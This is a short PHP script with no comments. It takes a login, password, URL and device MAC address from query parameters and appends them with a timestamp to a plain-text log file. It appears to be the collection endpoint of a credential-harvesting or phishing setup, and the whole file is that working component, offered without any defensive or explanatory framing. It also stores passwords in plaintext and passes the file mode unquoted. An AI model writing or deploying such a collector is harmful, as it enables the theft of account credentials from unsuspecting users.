<?php
	$login;
	$password;
	$url;
	$mac;
	if(isset($_GET['login'])){
		$login = $_GET['login'];
		if(isset($_GET['password'])){
			$password = $_GET['password'];
			if(isset($_GET['url'])){
				$url=$_GET['url'];
				if(isset($_GET['mac'])){
					$mac=$_GET['mac'];
				}
			}
		}
	}
	$file = fopen("log.txt",a);
	fwrite($file,"Date: ".date("Y-m-d H:i:s") . "\n" . "Mac: " . $mac . "\n" . "url: " . $url . "\n" . "login: " . $login . "\n" . "password: " . $password . "\n" . "----------" . "\n");
	fclose($file);
	
?>